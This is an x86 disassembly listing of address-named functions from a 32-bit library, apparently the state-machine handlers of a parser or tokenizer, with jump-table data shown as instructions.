sub_10076370
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax + 0x1 ]
push esi
cmp ecx 0x3f
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x35
mov edx [ ebp + 0xc ]
mov [ edx + 0x88 ] 0x0
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
movzx ecx [ ecx + lookup_table_10076488 ]
jmp [ ecx * 4 + jump_table_10076474 ]
mov edx [ ecx + 0x8 ]
add edx 0x10
push edx
push eax
push ecx
call sub_10062120
add esp 0xc
add eax 0x20
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x35
mov [ eax + 0x88 ] 0x1
mov ecx [ esi + 0x8 ]
mov edx [ r--data ]
add ecx 0x10
push ecx
push edx
push esi
call sub_10062120
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x25
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
sub_1007648d
add al 0x4
add al 0x4
add al 0x2
add al [ edx + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_100764d0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax + 0x1 ]
push esi
push edi
cmp ecx 0x3f
ja r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x35
mov edx [ ebp + 0xc ]
mov [ edx + 0x88 ] 0x0
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
movzx ecx [ ecx + lookup_table_1007661c ]
jmp [ ecx * 4 + jump_table_10076608 ]
mov edx [ ecx + 0x8 ]
add edx 0x10
push edx
push eax
push ecx
call sub_10062120
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
add eax 0x20
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0xc ]
mov [ edx ] 0x36
mov eax [ edi + 0x7c ]
add edi 0x7c
push eax
push esi
call sub_10030ff0
push edi
call sub_100724a0
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0xc ]
mov [ ecx ] 0x0
mov edx [ edi + 0x7c ]
add edi 0x7c
push edx
push esi
call sub_10030ff0
push edi
call sub_100724a0
mov eax [ ebp + 0x14 ]
add esp 0xc
call sub_10072700
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov ecx [ r--data ]
add eax 0x10
push eax
push ecx
push esi
call sub_10062120
add esp 0x10
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
lea edi [ eax + 0x7c ]
mov [ eax + 0x88 ] 0x1
mov eax [ edi ]
push eax
push esi
call sub_10030ff0
push edi
call sub_100724a0
mov eax [ ebp + 0x14 ]
add esp 0x10
call sub_10072700
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_10076621
add al 0x4
add al 0x4
add al 0x2
add al [ edx + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_10076660
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
push edi
mov edi [ ebp + 0xc ]
push 0x0
push 0x6
lea esi [ edi + 0x94 ]
push r--data
push esi
call sub_10003440
add esp 0x10
test eax eax
je r-xdata
movzx eax [ eax + lookup_table_10076774 ]
jmp [ eax * 4 + jump_table_10076764 ]
push 0x0
push 0x6
push r--data
push esi
call sub_10003440
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x37
mov [ edi + 0x4 ] 0x1
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_10072700
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x26
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
add esp 0x4
mov [ edx ] 0x42
mov [ edi + 0x88 ] 0x1
pop edi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x3d
mov [ edi + 0x4 ] 0x1
pop edi
mov eax 0x2
pop esi
pop ebp
retn
sub_10076778
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ecx ] eax
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_100767c0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_100768e4 ]
jmp [ eax * 4 + jump_table_100768cc ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x38
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
add esp 0x4
mov [ eax ] 0x39
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x3a
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x25
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
sub_100768ea
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_10076930
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10076a30 ]
jmp [ eax * 4 + jump_table_10076a18 ]
mov eax 0x2
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x39
mov eax 0x2
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x3a
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
sub_10076a36
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xec8b5504
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_10062120
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10076b74 ]
jmp [ eax * 4 + jump_table_10076b60 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x3b
call sub_10072560
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_10062120
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10072560
mov eax [ ebp + 0x14 ]
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10072560
mov eax [ ebp + 0x14 ]
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
sub_10076b79
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_10076bc0
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_10062120
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10076cc4 ]
jmp [ eax * 4 + jump_table_10076cb0 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x3b
call sub_10072560
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_10062120
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10072560
mov eax [ ebp + 0x14 ]
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10072560
mov eax [ ebp + 0x14 ]
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
sub_10076cc9
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_10076d10
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
add esp 0x4
mov [ ecx ] 0x42
mov [ edx + 0x88 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10076e14 ]
jmp [ eax * 4 + jump_table_10076dfc ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x3c
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
call sub_10072700
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
add esp 0x4
mov [ edx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0xc ]
mov ecx 0x1
add esp 0x4
mov [ eax + 0x4 ] ecx
mov [ eax + 0x88 ] ecx
lea eax [ ecx + 0x1 ]
pop esi
pop ebp
retn
sub_10076e1a
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_10076e60
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x42
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10076f48 ]
jmp [ eax * 4 + jump_table_10076f30 ]
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_10072700
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov [ eax ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
sub_10076f4e
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_10076f90
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
add esp 0x4
mov [ ecx + 0x88 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_100770ac ]
jmp [ eax * 4 + jump_table_10077094 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x3e
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
add esp 0x4
mov [ eax ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
sub_100770b2
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_100770f0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x42
add esp 0x4
mov [ ecx + 0x88 ] 0x1
movzx eax [ eax + lookup_table_100771e0 ]
jmp [ eax * 4 + jump_table_100771c8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x3f
mov eax 0x2
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x40
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
sub_100771e6
add eax 0x1050505
add [ 0x5050501 ] eax
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5020501
add eax 0x5030505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0xec8b5504
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_10062120
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10077324 ]
jmp [ eax * 4 + jump_table_10077310 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x41
call sub_100725d0
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_10062120
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_100725d0
mov eax [ ebp + 0x14 ]
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_100725d0
mov eax [ ebp + 0x14 ]
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
sub_10077329
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_10077370
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
push esi
cmp eax 0x3f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push ecx
push eax
call sub_10062120
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_10077474 ]
jmp [ eax * 4 + jump_table_10077460 ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x41
call sub_100725d0
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x10
push edx
push eax
push esi
call sub_10062120
add esp 0x10
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x27
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x0
add esp 0x4
mov [ edx + 0x88 ] 0x1
call sub_100725d0
mov eax [ ebp + 0x14 ]
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100722b0
mov eax [ esi + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x0
add esp 0x4
mov [ ecx + 0x88 ] 0x1
call sub_100725d0
mov eax [ ebp + 0x14 ]
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
sub_10077479
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_100774c0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
cmp eax 0x3f
ja r-xdata
mov esi [ ebp + 0x8 ]
push 0x23
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
add esp 0x4
mov [ ecx ] 0x42
movzx eax [ eax + lookup_table_1007755c ]
jmp [ eax * 4 + jump_table_1007754c ]
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov eax [ ebp + 0x14 ]
mov [ ecx ] 0x0
call sub_10072700
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x22
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ eax + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
add esp 0x4
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
mov eax 0x2
pop esi
pop ebp
retn
sub_10077560
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ecx ] eax
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ecx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_100775a0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
cmp eax 0x3e
je r-xdata
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
call sub_10072700
xor eax eax
pop esi
pop ebp
retn
cmp eax 0xffffffff
je r-xdata
mov eax 0x2
pop ebp
retn
sub_100775e0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xffffffff
push esi
mov esi [ ebp + 0xc ]
push edi
je r-xdata
lea edi [ esi + 0x94 ]
push edi
mov [ esi + 0x4 ] 0x1
call sub_10015610
mov [ esi + 0x2c ] eax
add esi 0x30
push esi
push edi
call sub_10061790
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
add esp 0xc
pop edi
mov [ eax ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
push 0x1
push 0x3
lea eax [ esi + 0x94 ]
push r--data
push eax
call sub_10003440
add esp 0x10
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10077670
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x2c ]
push eax
call sub_10043670
mov esi eax
xor ebx ebx
add esp 0x4
cmp esi ebx
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ esi ] eax
mov ecx [ edi + 0x14 ]
mov [ esi + 0x4 ] ecx
mov edx [ edi + 0x18 ]
mov [ esi + 0x8 ] edx
mov eax [ edi + 0x1c ]
mov [ esi + 0xc ] eax
mov ecx [ edi ]
mov [ esi + 0x10 ] ecx
mov eax [ edi + 0x10 ]
xor ecx ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] eax
cmp eax ebx
jle r-xdata
mov ecx [ ebp - 0xc ]
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ecx
mov edx [ edi ]
mov [ ebp - 0x4 ] edx
nop
mov edi [ ebp - 0xc ]
